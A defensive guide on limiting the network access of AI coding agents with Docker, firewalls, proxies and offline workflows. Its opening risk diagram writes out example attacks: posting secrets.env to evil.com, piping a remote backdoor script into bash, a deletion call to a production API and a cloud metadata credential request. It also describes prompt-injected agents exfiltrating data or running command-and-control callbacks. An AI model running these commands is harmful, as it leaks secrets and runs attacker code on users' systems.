# Network Access Control for AI Agents

> Controlling what AI agents can access on the network — because an agent with unrestricted internet access can exfiltrate your code, download malicious payloads, or call unauthorized APIs.

---

## Why Network Access Is Risky

AI coding agents with network access can perform actions that are invisible in your terminal output:

```
┌──────────────────────────────────────────────────────┐
│           NETWORK RISKS FOR AI AGENTS                │
│                                                      │
│  📤 Data Exfiltration                                │
│     AI sends your source code to external server     │
│     curl -X POST https://evil.com -d @secrets.env    │
│                                                      │
│  📥 Malicious Downloads                              │
│     AI installs compromised packages or scripts      │
│     curl https://evil.com/backdoor.sh | bash         │
│                                                      │
│  🌐 Unauthorized API Calls                           │
│     AI calls production APIs with ambient credentials│
│     curl -H "Auth: $TOKEN" https://prod.api/delete   │
│                                                      │
│  🔓 Credential Harvesting                            │
│     AI accesses cloud metadata endpoints             │
│     curl http://169.254.169.254/latest/meta-data/    │
│                                                      │
│  📡 C2 Communication                                 │
│     Prompt injection establishes command & control    │
│     Periodic callbacks to attacker-controlled server  │
└──────────────────────────────────────────────────────┘
```

## Network Access by Tool

| Tool | Default Network Access | Controllable? |
|------|----------------------|---------------|
| **Copilot CLI** | Full (inherits your terminal) | Via Docker/firewall |
| **Claude Code** | Full (bash can make requests) | Via sandbox config |
| **Copilot Coding Agent** | GitHub-managed container | Via devcontainer.json |
| **MCP Servers** | Depends on server implementation | Per-server basis |
| **VS Code Extensions** | Full (within VS Code process) | Via OS firewall |

## Control Strategies

### 1. Docker Network Isolation

The most practical approach for local development.

```bash
# Fully offline — no network access
docker run --rm \
  --network=none \
  -v "$(pwd):/workspace" \
  ai-sandbox copilot-cli

# Custom network with restricted access
docker network create --internal ai-restricted

docker run --rm \
  --network=ai-restricted \
  -v "$(pwd):/workspace" \
  ai-sandbox copilot-cli
```

**Docker network modes:**

| Mode | Effect | Use Case |
|------|--------|----------|
| `--network=none` | Zero network access | Offline coding, security-sensitive work |
| `--network=bridge` | Default Docker networking | General development |
| `--network=ai-restricted` | Custom internal-only | Container-to-container communication |
| `--network=host` | Full host network access | ❌ **Never use for AI sandboxes** |

### 2. Docker Compose with Network Policies

```yaml
# docker-compose.ai-sandbox.yml
version: "3.8"

services:
  ai-agent:
    build: .
    volumes:
      - ./:/workspace
    networks:
      - ai-network
    dns:
      - "127.0.0.1"  # Prevent DNS resolution

  # Optional: proxy for controlled package access
  registry-proxy:
    image: registry:2
    networks:
      - ai-network
      - external
    # Only the proxy can reach the internet

networks:
  ai-network:
    internal: true  # No external access
  external:
    driver: bridge  # Normal internet access (proxy only)
```

### 3. Firewall Rules

For host-level control without Docker.

**Windows Firewall (PowerShell):**

```powershell
# Block outbound traffic for AI agent process
New-NetFirewallRule `
  -DisplayName "Block AI Agent Outbound" `
  -Direction Outbound `
  -Action Block `
  -Program "C:\path\to\agent\process.exe"

# Allow only npm registry
New-NetFirewallRule `
  -DisplayName "Allow npm Registry" `
  -Direction Outbound `
  -Action Allow `
  -RemoteAddress "104.16.0.0/12" `
  -Program "C:\path\to\agent\process.exe"
```

**Linux iptables:**

```bash
# Create a group for AI agent processes
sudo groupadd aiagent

# Block all outbound traffic for aiagent group
sudo iptables -A OUTPUT -m owner --gid-owner aiagent -j DROP

# Allow DNS
sudo iptables -I OUTPUT -m owner --gid-owner aiagent \
  -p udp --dport 53 -j ACCEPT

# Allow npm registry
sudo iptables -I OUTPUT -m owner --gid-owner aiagent \
  -d registry.npmjs.org -p tcp --dport 443 -j ACCEPT

# Allow PyPI
sudo iptables -I OUTPUT -m owner --gid-owner aiagent \
  -d pypi.org -p tcp --dport 443 -j ACCEPT

# Run AI agent in restricted group
sudo -g aiagent copilot-cli
```

### 4. Proxy-Based Monitoring

Route AI traffic through a proxy to log and filter requests.

```bash
# Start a local monitoring proxy (e.g., mitmproxy)
mitmproxy --mode regular --listen-port 8080 \
  --set block_global=false \
  --set allow_hosts='registry.npmjs.org|pypi.org|api.github.com'

# Run AI agent through the proxy
HTTP_PROXY=http://localhost:8080 \
HTTPS_PROXY=http://localhost:8080 \
copilot-cli "Install dependencies and fix tests"
```

**Proxy benefits:**
- Full visibility into AI network requests
- Ability to block suspicious requests in real-time
- Request logging for audit trails
- Domain allowlisting

### 5. VPN Split Tunneling

Prevent the AI from accessing internal network resources.

```
┌──────────────────────────────────────────────────────┐
│              VPN SPLIT TUNNEL CONFIG                  │
│                                                      │
│  AI Agent Traffic:                                   │
│    ✅ registry.npmjs.org     → Direct internet       │
│    ✅ pypi.org               → Direct internet       │
│    ✅ api.github.com         → Direct internet       │
│    ❌ internal.company.com   → BLOCKED               │
│    ❌ 10.0.0.0/8             → BLOCKED               │
│    ❌ 172.16.0.0/12          → BLOCKED               │
│    ❌ 192.168.0.0/16         → BLOCKED               │
│                                                      │
│  Your Browser/Normal Traffic:                        │
│    ✅ All routes available via VPN                    │
└──────────────────────────────────────────────────────┘
```

## The Offline-First Pattern

The safest approach: **download dependencies first, then work offline.**

```bash
# Phase 1: Online — install dependencies (human-supervised)
npm ci
pip install -r requirements.txt

# Phase 2: Offline — AI works without network
docker run --rm \
  --network=none \
  -v "$(pwd):/workspace" \
  ai-sandbox copilot-cli "Refactor the auth module"

# Phase 3: Online — human reviews and pushes
git diff
git push origin feature-branch
```

This pattern ensures the AI **never has network access** while it's actively modifying code. Dependencies are already available locally.

```
┌─────────────────────────────────────────────────────┐
│            OFFLINE-FIRST WORKFLOW                     │
│                                                      │
│  ┌──────────┐   ┌──────────┐   ┌──────────┐        │
│  │ ONLINE   │   │ OFFLINE  │   │ ONLINE   │        │
│  │          │   │          │   │          │        │
│  │ Install  │──▶│ AI codes │──▶│ Review   │        │
│  │ deps     │   │ & tests  │   │ & push   │        │
│  │ (human)  │   │ (agent)  │   │ (human)  │        │
│  └──────────┘   └──────────┘   └──────────┘        │
│                                                      │
│  Network: ✅     Network: ❌    Network: ✅          │
│  Actor: Human    Actor: AI      Actor: Human         │
└─────────────────────────────────────────────────────┘
```

## When Network Access Is Needed

Some tasks genuinely require network access:

| Task | Network Needed For | Mitigation |
|------|-------------------|------------|
| Installing dependencies | Package registries | Allowlist registries only |
| Fetching API docs | Documentation sites | Use MCP context servers instead |
| API testing | Localhost or staging | Allow only local/staging endpoints |
| Cloning submodules | Git hosts | Allow GitHub/GitLab only |
| Running E2E tests | Application server | Localhost only |

### Allowlist by Task Type

```bash
# Task: Install and build
# Allow: npm registry, GitHub (for git deps)
docker run --rm \
  --add-host="registry.npmjs.org:$(dig +short registry.npmjs.org)" \
  -v "$(pwd):/workspace" \
  ai-sandbox npm ci && npm run build

# Task: Run tests against local API
# Allow: localhost only
docker run --rm \
  --network=host \
  --add-host="external.api.com:127.0.0.1" \
  -v "$(pwd):/workspace" \
  ai-sandbox npm test
```

## MCP Server Network Considerations

MCP servers are a **hidden network access vector**. Each server may make its own network requests:

```
┌──────────────────────────────────────────────────────┐
│           MCP SERVER NETWORK ACCESS                  │
│                                                      │
│  AI Agent ──→ MCP Server ──→ External Service        │
│                                                      │
│  The AI tells the MCP server to make a request.      │
│  You approved the MCP tool, but did you approve      │
│  the network request the tool makes?                 │
│                                                      │
│  Examples:                                           │
│  • GitHub MCP → api.github.com (expected)            │
│  • Database MCP → your-db.internal (expected)        │
│  • "Context" MCP → unknown-api.com (suspicious!)     │
│                                                      │
│  Mitigation:                                         │
│  • Run MCP servers in their own containers           │
│  • Audit MCP server source code                      │
│  • Monitor MCP server network traffic                │
└──────────────────────────────────────────────────────┘
```

```bash
# Run an MCP server in a network-restricted container
docker run --rm \
  --network=ai-mcp-network \
  -e "ALLOWED_HOSTS=api.github.com" \
  github-mcp-server
```

## Tips

✅ **Do:**
- Default to `--network=none` and add access only when needed
- Use the offline-first pattern: install deps (online), code (offline), push (online)
- Run MCP servers in their own containers with restricted networking
- Monitor network traffic when AI agents do need access
- Use proxy servers for visibility into AI network requests

❌ **Don't:**
- Assume AI agents won't make unexpected network requests
- Use `--network=host` for AI sandboxes — it exposes everything
- Forget that MCP servers are a network access vector
- Allow AI agents to access cloud metadata endpoints (169.254.169.254)
- Trust that the AI "wouldn't" exfiltrate data — plan for the worst case
